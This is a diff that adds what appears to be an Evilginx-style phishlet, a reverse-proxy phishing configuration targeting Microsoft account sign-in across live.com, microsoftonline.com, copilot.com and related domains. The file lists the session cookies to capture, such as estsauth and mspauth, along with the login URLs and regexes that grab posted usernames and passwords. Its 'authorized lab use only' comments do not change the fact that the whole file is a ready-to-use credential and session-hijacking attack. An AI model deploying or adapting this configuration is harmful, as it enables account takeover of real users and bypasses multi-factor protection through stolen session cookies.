@@ -1,0 +1,172 @@
+# Authorized lab use only — synthetic/sanitized metadata; never use against unauthorized targets.
+# Coverage: complete; credential keys: heuristic login/passwd; no password form was captured
+# Authorized lab scaffold only; configure phishlet domain/lures and lab-test separately.
+author: "lab-operator"
+min_ver: "2.3.0"
+proxy_hosts:
+  - phish_sub: "m365"
+    orig_sub: "m365"
+    domain: "cloud.microsoft"
+    session: true
+    is_landing: false
+    auto_filter: true
+  - phish_sub: "ms-sso"
+    orig_sub: "ms-sso"
+    domain: "copilot.com"
+    session: true
+    is_landing: false
+    auto_filter: true
+  - phish_sub: "login"
+    orig_sub: "login"
+    domain: "live.com"
+    session: true
+    is_landing: true
+    auto_filter: true
+  - phish_sub: "ms-sso"
+    orig_sub: "ms-sso"
+    domain: "microsoft.com"
+    session: true
+    is_landing: false
+    auto_filter: true
+  - phish_sub: "login"
+    orig_sub: "login"
+    domain: "microsoftonline.com"
+    session: true
+    is_landing: false
+    auto_filter: true
+  - phish_sub: "logincdn"
+    orig_sub: "logincdn"
+    domain: "msauth.net"
+    session: false
+    is_landing: false
+    auto_filter: true
+  - phish_sub: "res"
+    orig_sub: "res"
+    domain: "static.microsoft"
+    session: true
+    is_landing: false
+    auto_filter: true
+auth_tokens:
+  - domain: "cloud.microsoft"
+    keys:
+      - "cs"
+      - "ohpcode"
+  - domain: "copilot.com"
+    keys:
+      - "fpc"
+      - "stsservicecookie"
+      - "x-ms-gateway-slice"
+  - domain: "live.com"
+    keys:
+      - "__host-msaauth"
+      - "__host-msaauthp"
+      - "anon"
+      - "jsh"
+      - "lopt"
+      - "mspauth"
+      - "mspback"
+      - "mspcid"
+      - "mspoauthvis"
+      - "mspok"
+      - "msppre"
+      - "mspprof"
+      - "msprequ"
+      - "mspshared"
+      - "nap"
+      - "oparams"
+      - "oparams1"
+      - "pplstate"
+      - "pres"
+      - "sdidc"
+      - "uaid"
+      - "wlssc"
+  - domain: "microsoft.com"
+    keys:
+      - "fpc"
+      - "stsservicecookie"
+      - "x-ms-gateway-slice"
+  - domain: "microsoftonline.com"
+    keys:
+      - "esctx"
+      - "esctx-rsa95v4r78"
+      - "estsauth"
+      - "estsauthlight"
+      - "estsauthpersistent"
+      - "fpc"
+      - "stsservicecookie"
+      - "x-ms-gateway-slice"
+auth_urls:
+  - "/oauth20_authorize.srf"
+  - "/GetCredentialType.srf"
+  - "/checkpassword.srf"
+  - "/ppsecure/post.srf"
+  - "/consumers/savestate"
+  - "/9188040d-6c67-4c5b-b112-36a304b66dad/oauth2/v2.0/token"
+  - "/consumers/oauth2/v2.0/token"
+login:
+  domain: "live.com"
+  path: "/ppsecure/post.srf"
+credentials:
+  username:
+    key: "login"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "passwd"
+    search: "(.*)"
+    type: "post"
+sub_filters:
+  - triggers_on: "m365.cloud.microsoft"
+    orig_sub: "m365"
+    domain: "cloud.microsoft"
+    search: "https://{hostname}/"
+    replace: "https://{hostname}/"
+    mimes:
+      - "text/html"
+      - "application/json"
+      - "application/javascript"
+  - triggers_on: "ms-sso.copilot.com"
+    orig_sub: "ms-sso"
+    domain: "copilot.com"
+    search: "https://{hostname}/"
+    replace: "https://{hostname}/"
+    mimes:
+      - "text/html"
+      - "application/json"
+      - "application/javascript"
+  - triggers_on: "login.live.com"
+    orig_sub: "login"
+    domain: "live.com"
+    search: "https://{hostname}/"
+    replace: "https://{hostname}/"
+    mimes:
+      - "text/html"
+      - "application/json"
+      - "application/javascript"
+  - triggers_on: "ms-sso.microsoft.com"
+    orig_sub: "ms-sso"
+    domain: "microsoft.com"
+    search: "https://{hostname}/"
+    replace: "https://{hostname}/"
+    mimes:
+      - "text/html"
+      - "application/json"
+      - "application/javascript"
+  - triggers_on: "login.microsoftonline.com"
+    orig_sub: "login"
+    domain: "microsoftonline.com"
+    search: "https://{hostname}/"
+    replace: "https://{hostname}/"
+    mimes:
+      - "text/html"
+      - "application/json"
+      - "application/javascript"
+  - triggers_on: "res.static.microsoft"
+    orig_sub: "res"
+    domain: "static.microsoft"
+    search: "https://{hostname}/"
+    replace: "https://{hostname}/"
+    mimes:
+      - "text/html"
+      - "application/json"
+      - "application/javascript"
